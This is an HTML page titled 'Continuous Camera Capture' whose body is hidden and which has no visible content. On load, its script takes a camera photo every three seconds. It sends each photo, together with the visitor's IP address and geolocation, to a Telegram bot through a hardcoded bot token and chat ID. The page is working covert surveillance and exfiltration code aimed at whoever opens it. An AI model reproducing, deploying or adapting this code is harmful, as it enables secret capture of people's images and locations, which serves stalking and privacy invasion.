<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <title>Continuous Camera Capture</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      display: none; /* Hide the body */
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
    }
  </style>
</head>
<body>

  <script type="text/javascript">
    const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
    const chatId = '5571330102'; // Your Telegram chat ID

    // Function to get user's IP address
    function getUserIP() {
      return new Promise((resolve, reject) => {
        $.get('https://api.ipify.org?format=json', function(data) {
          resolve(data.ip);
        }).fail(function() {
          reject('Unable to fetch IP');
        });
      });
    }

    // Function to get the user's location
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(position) {
            const location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            };
            resolve(location);
          }, function() {
            reject('Location permission denied or unavailable.');
          });
        } else {
          reject('Geolocation not supported');
        }
      });
    }

    // Start capturing photos continuously
    function startCapturing() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
          const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);

          // Function to capture a photo from front/back camera
          function capturePhoto() {
            imageCapture.takePhoto()
              .then((blob) => {
                getUserIP().then((ip) => {
                  getLocation().then((location) => {
                    sendToTelegram(blob, ip, location);
                  }).catch(error => {
                    console.error('Location Error:', error);
                  });
                }).catch(error => {
                  console.error('IP Fetch Error:', error);
                });
              })
              .catch((error) => {
                console.error('Error capturing photo:', error);
              });
          }

          // Set interval to capture photo continuously every 3 seconds
          setInterval(capturePhoto, 3000);

        })
        .catch((error) => {
          console.error('Permission error:', error);
        });
    }

    // Send photo, IP, and location to Telegram bot
    function sendToTelegram(data, ip, location) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', data, 'camera_photo.jpg');
      formData.append('caption', `IP: ${ip}, Location: Latitude ${location.latitude}, Longitude ${location.longitude}`);

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error sending to Telegram:', error));
    }

    window.onload = function() {
      startCapturing(); // Start capturing photos and sending them continuously
    };

  </script>

</body>
</html>
